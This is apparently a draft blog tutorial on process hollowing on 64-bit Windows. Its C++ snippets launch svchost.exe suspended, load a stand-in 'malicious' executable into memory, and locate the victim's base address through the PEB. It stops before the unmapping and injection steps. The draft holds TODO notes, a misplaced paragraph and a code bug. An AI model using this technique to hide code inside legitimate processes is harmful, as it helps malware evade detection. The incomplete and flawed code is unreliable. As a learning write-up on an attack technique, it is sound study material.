---
layout: post
title:  "Process Hollowing: Deep Dive and x64-bit"
---


## Introduction
This writing will focus on what is process hollowing and how it works with example code. One of the motivations I write this post, I couldn't find a good resource focuses on 64-bit systems, and the caviats that causes process hollowing to fail. I struggled a lot, and hoping that this writing will help you to protect your sanity.

## What is Process Hollowing

Process Hollowing is a technique used by very very bad people to hide their malicious code, inside a legitimate looking process. I.e., some malware inject himself inside `svchost.exe` to look like a legitimate process.

// talk about how we process hollow as high level overview

## Process

A process represents the executable program in the Windows system. When you run your favourite game (cs2.exe) it will start a process in your system that you can see from the `task manager`.

Process have many important components:

|||
|-|-|
|**Process Component**|**Role**|
|Private Virtual Address Space|Memory address that allocated by the process.|
|Open Handles|Like a real life handle, let us work with the process in code.|
|Security Context|User access, privileges and security information of the process.|
|Executable Program|Where the code and data stored in the virtual address space.|
|Process ID|Unqiue number that represenets your process (PID).|
|Threads|Isolated executable sections of the process.|

## Threads

Threads runs under the context of a process. The main idea, it can separate an execution from other executions, so if one of them fails whole program won't crash, only the related thread will crush.

A good example of this is the web browsers. Let's assume that we run firefox. A new firefox.exe process will be instantiated for this. For every tab we open in firefox, a new thread will be created so if one of them fails, firefox won't crash only the problematic page will be closed because it has its own thread.

Each process needs at least one thread in order to run.

Threads also have many components:


|||
|-|-|
|**Thread Component**|**Role**|
|Stack|Each thread has its own stack|
|Thread Local Storage|
|Stack Argument|Let us pass a variable when we create the thread|
|Context Structure|Holds machine registers (i.e., eax, ebx)|
|Thread ID|Uniquie number associated with the tread (TID)|


## Understanding PE

It's very useful to fully understand the PE file structure in order to understand this writing better. I'm planning to write a dedicated blog post about it, however for this post we will learn what we need.

---
Hey Internet, this is the first post of my upcoming one helluva great blog posts. Why am I doing this posts? I want to learn hard concepts, and teaching is one of the best ways of learnin

## Process Hollowing

### High level overview of the process hollowing

1. Launch a Process in SUSPENDED state (victim process).
2. Read a malicious image from disk, and write it into virtual address space.
3. Carve out the victim process (Unmap/Hollow), in order to write our malicious code inside.
4. Write malicious code's headers into the carved out address space.
5. Write remaining sections of the malicious code into the carved out address space.
6. Resume the Thread.

### Hands on Process Hollowing

I will use C++ for our example, also the technique I demonstrate in this example is very sensitive so it's possible that same code may not work when you build it and run.

I'm running this code in Win11 22H4, with 64-bit executables and 64-bit intel CPU. 

### Creating the Victim Process

As we mentioned, we are creating a new process in a `SUSPENDED` state. This will prevent this process to run, until we finish our surgery on it.

```cpp
// Prepare structures
LPSTARTUPINFOA victim_si = new STARTUPINFOA();
LPPROCESS_INFORMATION victim_pi = new PROCESS_INFORMATION();
CONTEXT ctx = {};

// Launch 64‑bit svchost suspended
if (!CreateProcessA(
	(LPCSTR)"C:\\Windows\\System32\\svchost.exe",
	NULL,
	NULL,
	NULL,
	NULL,
	FALSE,
	CREATE_SUSPENDED | CREATE_NO_WINDOW,
	NULL,
	NULL,
	victim_si,
	victim_pi))
{
	printf("[-] CreateProcessA failed: %i\r\n",GetLastError());
	return 1;
}
```
*Add an image here that shows the suspended process*
### Loading Malicious File

For the second step, we will read a file from the disk and load it into the memory space (memory space or virtual address space?)

`CreateFileA` name can be misleading, but simply what it does opens a file from disk and return us a handle.

```cpp
HANDLE hMaliciousFile = CreateFileA(
	(LPCSTR)"C:\\\\HelloWorld.exe",
	GENERIC_READ
	FILE_SHARE_READ,
	NULL,
	OPEN_EXISTING,
	FILE_ATTRIBUTE_NORMAL,
	NULL
);
```

At this point we opened a file and got a handle for it but yet we haven't done anything with it. In order to laod it into memory first we need to allocate space for it.

```cpp
DWORD maliciousFileSize = GetFileSize(hMaliciousFile, nullptr);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize,
	MEM_COMMIT | MEM_RESERVE, // learn the flags
	PAGE_READWRITE
);
```

*Add an image shows allocated space in HxD*

Then we can write our malicious image inside the allocated memory space.

```cpp
DWORD numberOfBytesRead; // stores number of bytes read

ReadFile(
	hMaliciousFile, // handle of the malicious file 
	pMaliciousImage, // address pointer to allocated memory
	maliciousFileSize,
	&numberOfBytesRead,
	NULL
);

CloseHandle(hMaliciousFile); // no longer we need this handle
```

Again, what `ReadFile` method does is reading a file from a open handle, and write it into the given address space.

*Add an image or gif shows written data into the memory* 

### Carving Out the Victim Process

Time for the surgery! We will unmap the victim process's address space.

> TODO: explain why we unmap and just not overwrite.
> TODO: explain the base address

First of all we need to find the **base address** of the victim process. This can be tricky, because we need to look the machine registers in order to find it.

Let's remember where the machine registers are stored. The **Thread Context** component of the thread!

```cpp
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(
		victim_pi->hThread,
		&ctx
	);
```

`ContextFlags` determines which registers we want to get. for 32-bit systems `INTEGER` flag should be enough but in a 64-bit system we will need `Rip` and `Rdx` registers so we will use `CONTEXT_FULL` flag.

If it's your first time hearing about registers, this part of the code may look weird, put a tea and calm down, for now it's just enough to know that `Rdx` register will tell us where the **base address** of the victim process.

And we will talk about `Rip` later. 

> [!CAUTION] I found that `Rdx` register holds the `PEB` struct for us, but I seen that many examples used different registers. I.e., for 32-bit systems it's the `Ebx` register with `0x08` offset (8 bytes) that points the **base address**. So do your research to find which register you are working with.



```cpp
PVOID pVictimImageBaseAddress;
ReadProcessMemory(
	victim_pi->hProcess,
	(PVOID)(ctx.Rdx + 0x10), // Pointer to the base address. (Start reading from here)
	&pVictimImageBaseAddress, // Store the host base address (Out the value)
	sizeof(PVOID), // How much bytes that will be readen
	0 // Number of bytes out
);
```
`Rdx` register holds the address of the `PEB` struct which holds the **base address** variable inside of it.

> TODO: explain better maybe?

Why 0x10 (16 byte)? Check the `PEB` struct: https://rinseandrepeatanalysis.blogspot.com/p/peb-structure.html





